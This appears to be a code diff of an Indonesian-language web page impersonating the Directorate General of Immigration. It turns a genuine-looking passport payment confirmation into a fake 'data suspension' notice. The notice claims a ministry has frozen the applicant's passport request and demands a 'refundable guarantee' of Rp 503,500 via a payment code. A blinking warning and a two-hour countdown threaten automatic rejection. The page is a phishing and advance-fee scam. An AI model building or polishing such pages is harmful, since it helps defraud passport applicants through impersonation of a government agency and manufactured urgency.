@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Status Pembayaran Berhasil</title>
+    <title>Notifikasi Penangguhan Data</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,7 @@
         }
         
         .header {
-            background-color: #003366;
+            background-color: #e63946;
             color: white;
             padding: 20px;
             text-align: center;
@@ -58,32 +58,43 @@
             padding: 25px;
         }
         
-        .success-icon {
+        .warning-text-container {
             text-align: center;
             margin: 20px 0;
         }
         
-        .success-icon img {
-            width: 80px;
-            height: 80px;
+        .warning-text {
+            font-size: 32px;
+            font-weight: bold;
+            color: #e63946;
+            animation: blink 1s infinite;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
         
-        .success-message {
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        .warning-message {
             text-align: center;
             margin-bottom: 25px;
         }
         
-        .success-title {
+        .warning-title {
             font-size: 22px;
             font-weight: bold;
-            color: #28a745;
+            color: #e63946;
             margin-bottom: 10px;
         }
         
-        .success-text {
+        .warning-text-content {
             font-size: 16px;
             color: #333;
             line-height: 1.5;
+            text-align: left;
         }
         
         .info-section {
@@ -139,8 +150,117 @@
             margin: 15px 0;
             letter-spacing: 1px;
             user-select: all;
+            cursor: pointer;
             padding: 8px;
             border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        
+        .payment-code:hover {
+            background-color: #eaeaea;
+        }
+        
+        .copy-hint {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 5px;
+            font-style: italic;
+        }
+        
+        .timer-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .timer-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        
+        .timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e63946;
+            padding: 10px;
+            border: 2px solid #e63946;
+            border-radius: 5px;
+            display: inline-block;
+            min-width: 200px;
+        }
+        
+        .warning-box {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #5d4037;
+        }
+        
+        .guarantee-info {
+            background-color: #e8f5e9;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #4caf50;
+        }
+        
+        .guarantee-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #2e7d32;
+            margin-bottom: 8px;
+        }
+        
+        .guarantee-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+            gap: 10px;
+        }
+        
+        .btn {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #002244;
+        }
+        
+        .btn-payment {
+            background-color: #e63946;
+        }
+        
+        .btn-payment:hover {
+            background-color: #c41e3a;
+        }
+        
+        .footer {
+            background-color: #f1f1f1;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .copyright {
+            font-weight: 500;
         }
         
         .office-address {
@@ -164,77 +284,6 @@
             line-height: 1.5;
         }
         
-        .next-steps {
-            background-color: #f0fff0;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-left: 4px solid #28a745;
-        }
-        
-        .next-steps-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #28a745;
-            margin-bottom: 8px;
-        }
-        
-        .next-steps-text {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            margin-top: 25px;
-        }
-        
-        .btn {
-            background-color: #28a745;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            text-decoration: none;
-            display: inline-block;
-        }
-        
-        .btn:hover {
-            background-color: #218838;
-        }
-        
-        .footer {
-            background-color: #f1f1f1;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .copyright {
-            font-weight: 500;
-        }
-        
-        .refresh-notice {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #003366;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 5px;
-            font-size: 14px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            opacity: 0;
-            transition: opacity 0.5s;
-        }
-        
         @media (max-width: 480px) {
             .popup-container {
                 max-width: 100%;
@@ -252,12 +301,25 @@
                 padding: 20px 15px;
             }
             
+            .warning-text {
+                font-size: 28px;
+            }
+            
             .payment-amount {
                 font-size: 20px;
             }
             
             .payment-code {
                 font-size: 16px;
+            }
+            
+            .timer {
+                font-size: 20px;
+                min-width: 180px;
+            }
+            
+            .btn-container {
+                flex-direction: column;
             }
         }
     </style>
@@ -266,18 +328,21 @@
     <div class="popup-container">
         <div class="header">
             <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">STATUS PEMBAYARAN</div>
-            <div class="subtitle">Pembayaran Permohonan Paspor Baru</div>
+            <div class="title">NOTIFIKASI PENANGGUHAN DATA</div>
+            <div class="subtitle">Pencegahan TKI Pekerja Ilegal</div>
         </div>
         
         <div class="content">
-            <div class="success-icon">
-                <img src="https://z-cdn-media.chatglm.cn/files/5a6d7e4e-0d9d-4b3d-9f7d-0e5c6e3b4a7c_success-icon.png?auth_key=1790939066-8d4b8c1f9b2e4d5a8c0e6f2a9b1c3d7-0-8f4e7d3c2b1a9f8e7d6c5b4a3f2e1d0" alt="Success Icon">
+            <div class="warning-text-container">
+                <div class="warning-text">PENANGGUHAN</div>
             </div>
             
-            <div class="success-message">
-                <div class="success-title">PEMBAYARAN BERHASIL!</div>
-                <div class="success-text">Terima kasih, pembayaran Anda telah berhasil diproses. Silakan unduh surat jadwal kedatangan untuk proses selanjutnya.</div>
+            <div class="warning-message">
+                <div class="warning-title">DATA ANDA DITANGGUHKAN</div>
+                <div class="warning-text-content">
+                    <p>Berdasarkan kebijakan Kementerian HAM, permohonan paspor Anda ditangguhkan untuk pencegahan TKI pekerja ilegal demi keamanan dan keselamatan.</p>
+                    <p style="margin-top: 10px;">Untuk membuka penangguhan data ini, Anda wajib memberikan sejumlah jaminan yang akan dikembalikan ketika paspor Anda terbit.</p>
+                </div>
             </div>
             
             <div class="info-section">
@@ -313,30 +378,38 @@
                 </div>
             </div>
             
+            <div class="guarantee-info">
+                <div class="guarantee-title">Informasi Jaminan</div>
+                <div class="guarantee-text">
+                    Jaminan sebesar Rp 503.500,00 wajib dibayarkan untuk membuka penangguhan data. Uang jaminan ini akan dikembalikan secara penuh ketika paspor Anda telah terbit dan diambil.
+                </div>
+            </div>
+            
             <div class="payment-info">
                 <div class="info-title">Informasi Pembayaran</div>
                 <div class="info-row">
                     <span class="info-label">Jumlah Pembayaran</span>
                 </div>
-                <div class="payment-amount">Rp 653.500,00</div>
+                <div class="payment-amount">Rp 503.500,00</div>
                 <div class="info-row">
                     <span class="info-label">Kode Pembayaran</span>
                 </div>
-                <div class="payment-code">910266000000327001</div>
+                <div class="payment-code" id="paymentCode">910266000000335085</div>
+                <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
             </div>
             
-            <div class="next-steps">
-                <div class="next-steps-title">Langkah Selanjutnya</div>
-                <div class="next-steps-text">
-                    1. Unduh surat jadwal kedatangan<br>
-                    2. Cetak surat jadwal kedatangan<br>
-                    3. Datang ke Kantor Imigrasi sesuai jadwal<br>
-                    4. Bawa persyaratan lengkap
-                </div>
+            <div class="timer-container">
+                <div class="timer-label">Batas Waktu Pembayaran</div>
+                <div class="timer" id="countdown">02:00:00</div>
+            </div>
+            
+            <div class="warning-box">
+                <strong>Perhatian:</strong> Harap melakukan pembayaran sebelum batas waktu yang ditentukan. Apabila batas waktu telah habis dan Anda belum melakukan pembayaran, maka permohonan Anda akan ditolak oleh sistem secara otomatis. Pastikan Anda tidak melakukan pembayaran di luar batas waktu yang telah ditentukan untuk menghindari penolakan permohonan.
             </div>
             
             <div class="btn-container">
-                <a href="https://drive.google.com/file/d/13Hl02N3KEHo_l2l84pnXxy5qq3bEjNUW/view?usp=sharing" target="_blank" class="btn" id="downloadBtn">Unduh Surat Jadwal Kedatangan</a>
+                <button class="btn" onclick="window.print()">Cetak Bukti</button>
+                <button class="btn btn-payment" onclick="showPaymentInfo()">Lakukan Pembayaran</button>
             </div>
         </div>
         
@@ -344,68 +417,124 @@
             <div class="copyright">Hak Cipta © 2023 Direktorat Jenderal Imigrasi Republik Indonesia</div>
         </div>
     </div>
-    
-    <div class="refresh-notice" id="refreshNotice">
-        Halaman akan diperbarui otomatis dalam <span id="countdown">10</span> detik
-    </div>
 
     <script>
-        // Mengatur countdown untuk refresh otomatis
-        let countdown = 10;
-        const countdownElement = document.getElementById('countdown');
-        const refreshNotice = document.getElementById('refreshNotice');
-        
-        // Tampilkan notifikasi refresh
-        refreshNotice.style.opacity = '1';
-        
-        // Update countdown setiap detik
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            countdownElement.textContent = countdown;
-            
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                // Refresh halaman untuk memperbarui halaman sebelumnya
-                if (window.history.length > 1) {
-                    window.history.back();
-                    // Jika tidak bisa kembali, refresh halaman saat ini
-                    setTimeout(() => {
-                        window.location.reload();
-                    }, 500);
-                } else {
-                    window.location.reload();
-                }
-            }
-        }, 1000);
-        
-        // Event listener untuk tombol unduh
-        document.getElementById('downloadBtn').addEventListener('click', function() {
-            // Tampilkan pesan sukses
-            const successMessage = document.createElement('div');
-            successMessage.style.position = 'fixed';
-            successMessage.style.top = '0';
-            successMessage.style.left = '0';
-            successMessage.style.width = '100%';
-            successMessage.style.backgroundColor = '#28a745';
-            successMessage.style.color = 'white';
-            successMessage.style.padding = '15px';
-            successMessage.style.textAlign = 'center';
-            successMessage.style.zIndex = '1000';
-            successMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
-            successMessage.innerHTML = '<strong>Success:</strong> Mengunduh Surat Jadwal Kedatangan...';
+        // Fungsi untuk menampilkan informasi pembayaran
+        function showPaymentInfo() {
+            // Buat elemen untuk menampilkan pesan
+            const notice = document.createElement('div');
+            notice.style.position = 'fixed';
+            notice.style.top = '0';
+            notice.style.left = '0';
+            notice.style.width = '100%';
+            notice.style.backgroundColor = '#003366';
+            notice.style.color = 'white';
+            notice.style.padding = '15px';
+            notice.style.textAlign = 'center';
+            notice.style.zIndex = '1000';
+            notice.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
+            notice.innerHTML = '<strong>Informasi:</strong> Silakan lakukan pembayaran menggunakan kode pembayaran yang tersedia.';
             
             // Tambahkan ke body
-            document.body.appendChild(successMessage);
+            document.body.appendChild(notice);
             
-            // Hapus pesan setelah 3 detik
+            // Hapus pesan setelah 5 detik
             setTimeout(() => {
-                successMessage.style.opacity = '0';
-                successMessage.style.transition = 'opacity 0.5s';
+                notice.style.opacity = '0';
+                notice.style.transition = 'opacity 0.5s';
                 setTimeout(() => {
-                    document.body.removeChild(successMessage);
+                    document.body.removeChild(notice);
                 }, 500);
-            }, 3000);
+            }, 5000);
+        }
+        
+        // Fungsi untuk menyalin kode pembayaran
+        document.getElementById('paymentCode').addEventListener('click', function() {
+            // Membuat elemen input sementara
+            const tempInput = document.createElement('input');
+            tempInput.value = this.textContent;
+            document.body.appendChild(tempInput);
+            
+            // Memilih dan menyalin teks
+            tempInput.select();
+            document.execCommand('copy');
+            
+            // Menghapus elemen input sementara
+            document.body.removeChild(tempInput);
+            
+            // Memberi tahu pengguna bahwa kode telah disalin
+            const originalText = this.textContent;
+            this.textContent = "Tersalin!";
+            this.style.backgroundColor = "#e6f7e6";
+            
+            // Mengembalikan teks asli setelah 2 detik
+            setTimeout(() => {
+                this.textContent = originalText;
+                this.style.backgroundColor = "";
+            }, 2000);
         });
+        
+        // Set waktu awal (2 jam dalam detik)
+        const initialTime = 2 * 60 * 60;
+        
+        // Cek apakah ada waktu tersisa di localStorage
+        let timeLeft = localStorage.getItem('paymentTimeLeft') 
+            ? parseInt(localStorage.getItem('paymentTimeLeft')) 
+            : initialTime;
+        
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (timeLeft <= 0) {
+            timeLeft = initialTime;
+        }
+        
+        // Simpan waktu tersisa ke localStorage
+        localStorage.setItem('paymentTimeLeft', timeLeft);
+        
+        // Update tampilan countdown
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('paymentTimeLeft', timeLeft);
+            
+            // Kurangi waktu
+            timeLeft--;
+            
+            // Jika waktu habis
+            if (timeLeft < 0) {
+                clearInterval(timerInterval);
+                document.getElementById('countdown').textContent = "WAKTU HABIS";
+                document.getElementById('countdown').style.color = "#ff0000";
+                
+                // Tampilkan pemberitahuan bahwa permohonan ditolak
+                const warning = document.querySelector('.warning-box');
+                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis. Anda harus membuat permohonan baru jika masih ingin mengajukan paspor.";
+                warning.style.backgroundColor = "#ffebee";
+                warning.style.borderLeftColor = "#f44336";
+                warning.style.color = "#c62828";
+                
+                // Nonaktifkan tombol cetak dan pembayaran
+                document.querySelectorAll('.btn').forEach(btn => {
+                    btn.disabled = true;
+                    btn.style.backgroundColor = "#cccccc";
+                    btn.style.cursor = "not-allowed";
+                });
+            }
+        }
+        
+        // Jalankan countdown setiap detik
+        updateCountdown();
+        const timerInterval = setInterval(updateCountdown, 1000);
     </script>
 </body>
 </html>
